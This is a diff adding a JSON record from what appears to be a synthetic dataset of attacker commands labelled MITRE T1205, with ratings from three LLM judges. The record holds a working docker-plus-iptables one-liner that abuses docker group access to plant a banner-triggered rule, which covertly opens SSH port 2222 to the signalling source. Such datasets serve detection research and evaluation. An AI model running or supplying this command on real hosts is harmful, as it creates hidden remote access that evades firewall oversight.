@@ -1,0 +1,57 @@
+{
+  "technique_id": "T1205",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "docker run --rm --net=host --cap-add=NET_ADMIN alpine sh -c \"apk add --no-cache iptables >/dev/null && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -j LOG --log-prefix 'T1205_SSH_BANNER ' --log-level 4 && iptables -I INPUT -p tcp --dport 22 -m string --string 'SSH-2.0-KNOCK' --algo bm -m recent --name t1205_ssh --set && iptables -I INPUT -p tcp --dport 2222 -m recent --name t1205_ssh --rcheck --seconds 30 --reap -j ACCEPT\"",
+  "explanation": "Leverages the SSH client banner 'SSH-2.0-KNOCK' as an application-specific signal. Upon seeing it on port 22, the rule logs the packet and briefly opens a hidden SSH port 2222 for the source IP.",
+  "rationale_steps": [
+    "Use docker to inject iptables rules into the host from docker_group context.",
+    "Detect a crafted SSH identification string to serve as a covert trigger.",
+    "Temporarily allow alternate SSH port 2222 for the signaling IP."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-4970f6eb-e8f8cfdb",
+  "source_prompt_hash": "4970f6eb",
+  "timestamp_utc": "2025-09-30T03:38:51.523409Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The docker invocation and chained iptables commands are properly quoted and use valid flags/modules, resulting in a well-formed, parseable command.",
+        "semantic_score": 4,
+        "semantic_justification": "It realistically implements Traffic Signaling by matching a specific SSH banner to set a recent list and temporarily allow port 2222 for the source IP, though it depends on host iptables support and elevated Docker privileges.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T14:10:08.045403Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is well-formed with balanced quotes, proper use of && separators, valid iptables flags, and correct docker run syntax throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 port-knocking via SSH banner string matching: it uses iptables string matching to detect a custom SSH banner 'SSH-2.0-KNOCK' on port 22, records the source IP with the 'recent' module, and conditionally opens port 2222 for that IP within a 30-second window, which is a textbook traffic signaling/port-knocking implementation.",
+        "combined_score": 5.0,
+        "confidence": 0.92,
+        "timestamp": "2026-02-19T03:47:22.074954Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is properly formatted with correct Docker flags, balanced quoting, and valid iptables module syntax.",
+        "semantic_score": 5,
+        "semantic_justification": "The logic correctly implements traffic signaling by using iptables to inspect packet payloads for a specific string and dynamically update firewall rules via the recent module.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-19T03:47:26.140607Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
